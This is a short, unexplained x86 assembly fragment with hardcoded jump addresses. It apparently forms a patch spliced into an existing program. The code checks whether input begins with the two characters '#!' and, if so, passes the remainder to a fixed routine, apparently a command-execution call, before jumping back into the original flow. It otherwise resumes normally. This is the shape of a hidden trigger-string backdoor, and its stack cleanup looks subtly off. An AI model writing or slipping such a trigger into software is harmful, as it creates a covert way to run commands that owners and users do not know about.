mov ecx , 0x8048631	
jmp ecx	
push edx			
movzx edx , byte ptr [eax] 
cmp edx , 35 			
pop edx
jnz label	
push edx
movzx edx , byte ptr [eax + 1 ]
cmp edx , 33
pop edx
jnz label
sub esp , 8	
add eax , 2 			
push eax	
mov ecx ,0x8048460	
call ecx
sub esp,4	
mov ecx , 0x804864E
jmp ecx	
label:
	mov ecx, 0x804863A
	jmp ecx

